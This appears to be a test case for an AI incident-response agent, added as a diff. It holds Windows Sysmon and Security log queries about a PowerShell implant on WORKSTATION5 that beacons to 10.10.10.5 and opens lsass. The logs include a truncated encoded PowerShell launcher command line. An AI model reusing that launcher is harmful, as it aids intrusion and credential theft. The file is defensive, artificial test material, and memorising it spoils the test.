@@ -1,0 +1,56 @@
+{
+  "case_id": "test-29:R_neg",
+  "profile": "Profile of window SDWIN-200807103913: 6982 events. Request: A PowerShell implant on WORKSTATION5 that beacons to 10.10.10.5 has opened lsass with write access. Stop process 1648 (powershell.exe) on WORKSTATION5.theshire.local. Target: {\"host\": \"WORKSTATION5.theshire.local\", \"pid\": 1648}.",
+  "queries": [
+    {
+      "sql": "SELECT * FROM process_create WHERE record_id IN (255, 260, 6230, 6291) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 255, \"ts\": \"2020-08-07T14:39:39.458000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Security\", \"event_id\": 4688, \"image\": \"C:\\\\Windows\\\\System32\\\\whoami.exe\", \"command_line\": \"\\\"C:\\\\windows\\\\system32\\\\whoami.exe\\\" /user\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": null, \"pid\": 7716, \"ppid\": 1648, \"user\": \"pgustavo\", \"integrity_level\": \"High\", \"hashes\": null}\n{\"record_id\": 260, \"ts\": \"2020-08-07T14:39:39.461000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\whoami.exe\", \"command_line\": \"\\\"C:\\\\windows\\\\system32\\\\whoami.exe\\\" /user\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": \"\\\"C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMA…[cut: 5088 chars]\", \"pid\": 7716, \"ppid\": 1648, \"user\": \"pgustavo\", \"integrity_level\": \"High\", \"hashes\": \"SHA1=8F1F9E265911956C7F8F3861C34DEF9B8FA63813,MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88\"}\n{\"record_id\": 6230, \"ts\": \"2020-08-07T14:41:45.838000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"command_line\": \"C:\\\\windows\\\\System32\\\\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\services.exe\", \"parent_command_line\": \"C:\\\\windows\\\\system32\\\\services.exe\", \"pid\": 2576, \"ppid\": 740, \"user\": \"system\", \"integrity_level\": \"System\", \"hashes\": \"SHA1=75C5A97F521F760E32A4A9639A653EED862E9C61,MD5=9520A99E77D6196D0D09833146424113,SHA256=DD191A5B23DF92E12A8852291F9FB5ED594B76A28A5A464418442584AFD1E048,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69\"}\n{\"record_id\": 6291, \"ts\": \"2020-08-07T14:41:45.863000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\taskhostw.exe\", \"command_line\": \"taskhostw.exe\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"parent_command_line\": \"C:\\\\windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\", \"pid\": 3152, \"ppid\": 1516, \"user\": \"pgustavo\", \"integrity_level\": \"High\", \"hashes\": \"SHA1=9245F36AA783167E0AFE948B1C0E8E7F3B81E3D4,MD5=8AC325C757FA721B272ECEA19EBCF745,SHA256=0BEC3128B241FA533DC5A9D3F62AA41323D205DEFC30DCDE228C5ECC2D1E50A9,IMPHASH=9CB27CAED52CB0AFFB32788922A0D083\"}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 4,
+      "registered": [
+        255,
+        260,
+        6230,
+        6291
+      ]
+    },
+    {
+      "sql": "SELECT * FROM process_access WHERE record_id IN (265, 798, 802, 805, 3367) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 265, \"ts\": \"2020-08-07T14:39:39.467000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"source_pid\": 1648, \"target_image\": \"C:\\\\windows\\\\system32\\\\whoami.exe\", \"target_pid\": 7716, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9d8e4|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+5f36a|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+5bd06|C:\\\\windows\\\\System32\\\\KERNEL32.DLL+1be93|C:\\\\windows\\\\assembly\\\\NativeImages_v4.0.30319…[cut: 1271 chars]\", \"user\": null}\n{\"record_id\": 798, \"ts\": \"2020-08-07T14:39:40.788000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\lsass.exe\", \"source_pid\": 768, \"target_image\": \"C:\\\\windows\\\\system32\\\\svchost.exe\", \"target_pid\": 2440, \"granted_access\": \"0x1000\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\system32\\\\lsasrv.dll+29d90|C:\\\\windows\\\\system32\\\\lsasrv.dll+149ab|C:\\\\windows\\\\SYSTEM32\\\\SspiSrv.dll+177c|C:\\\\windows\\\\System32\\\\RPCRT4.dll+76953|C:\\\\windows\\\\Syste…[cut: 700 chars]\", \"user\": null}\n{\"record_id\": 802, \"ts\": \"2020-08-07T14:39:40.790000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\svchost.exe\", \"source_pid\": 452, \"target_image\": \"C:\\\\windows\\\\system32\\\\lsass.exe\", \"target_pid\": 768, \"granted_access\": \"0x1000\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+6a7f5|c:\\\\windows\\\\system32\\\\lsm.dll+ff97|C:\\\\windows\\\\System32\\\\RPCRT4.dll+76953|C:\\\\windows\\\\System32\\\\RPCRT4.dll+da036|C:\\\\windows\\\\Syste…[cut: 663 chars]\", \"user\": null}\n{\"record_id\": 805, \"ts\": \"2020-08-07T14:39:40.791000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\svchost.exe\", \"source_pid\": 452, \"target_image\": \"C:\\\\windows\\\\system32\\\\lsass.exe\", \"target_pid\": 768, \"granted_access\": \"0x1000\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+6a7f5|c:\\\\windows\\\\system32\\\\lsm.dll+10daa|c:\\\\windows\\\\system32\\\\lsm.dll+1008d|C:\\\\windows\\\\System32\\\\RPCRT4.dll+76953|C:\\\\windows\\\\System3…[cut: 698 chars]\", \"user\": null}\n{\"record_id\": 3367, \"ts\": \"2020-08-07T14:39:54.081000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"source_pid\": 1648, \"target_image\": \"C:\\\\windows\\\\system32\\\\lsass.exe\", \"target_pid\": 768, \"granted_access\": \"0x1438\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+2726e|UNKNOWN(000002EE3192B4AD)\", \"user\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 5,
+      "registered": [
+        265,
+        798,
+        802,
+        805,
+        3367
+      ]
+    },
+    {
+      "sql": "SELECT * FROM network WHERE record_id IN (53, 54, 56, 57) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 53, \"ts\": \"2020-08-07T14:39:16.248000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Security\", \"event_id\": 5156, \"image\": \"\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe\", \"pid\": 1648, \"src_ip\": \"172.18.39.5\", \"src_port\": 65489, \"dst_ip\": \"10.10.10.5\", \"dst_port\": 80, \"protocol\": \"6\", \"direction\": \"outbound\", \"user\": null}\n{\"record_id\": 54, \"ts\": \"2020-08-07T14:39:18.260000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 3, \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"pid\": 1648, \"src_ip\": \"172.18.39.5\", \"src_port\": 65489, \"dst_ip\": \"10.10.10.5\", \"dst_port\": 80, \"protocol\": \"tcp\", \"direction\": \"outbound\", \"user\": \"pgustavo\"}\n{\"record_id\": 56, \"ts\": \"2020-08-07T14:39:18.260000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Security\", \"event_id\": 5156, \"image\": \"\\\\device\\\\harddiskvolume2\\\\windowsazure\\\\packages\\\\guestagent\\\\windowsazureguestagent.exe\", \"pid\": 3292, \"src_ip\": \"172.18.39.5\", \"src_port\": 65490, \"dst_ip\": \"169.254.169.254\", \"dst_port\": 80, \"protocol\": \"6\", \"direction\": \"outbound\", \"user\": null}\n{\"record_id\": 57, \"ts\": \"2020-08-07T14:39:18.260000\", \"host\": \"WORKSTATION5.theshire.local\", \"channel\": \"Security\", \"event_id\": 5156, \"image\": \"\\\\device\\\\harddiskvolume2\\\\packages\\\\plugins\\\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\\\1.4.1587.1\\\\networkwatcheragent\\\\networkwatcheragent.exe\", \"pid\": 3472, \"src_ip\": \"172.18.39.5\", \"src_port\": 52810, \"dst_ip\": \"169.254.169.254\", \"dst_port\": 80, \"protocol\": \"6\", \"direction\": \"outbound\", \"user\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 4,
+      "registered": [
+        53,
+        54,
+        56,
+        57
+      ]
+    }
+  ],
+  "findings": "Records 54, 255, 265, 3367 look relevant to the request; deciding on the next action.",
+  "retrieved": [
+    53,
+    54,
+    56,
+    57,
+    255,
+    260,
+    265,
+    798,
+    802,
+    805,
+    3367,
+    6230,
+    6291
+  ]
+}
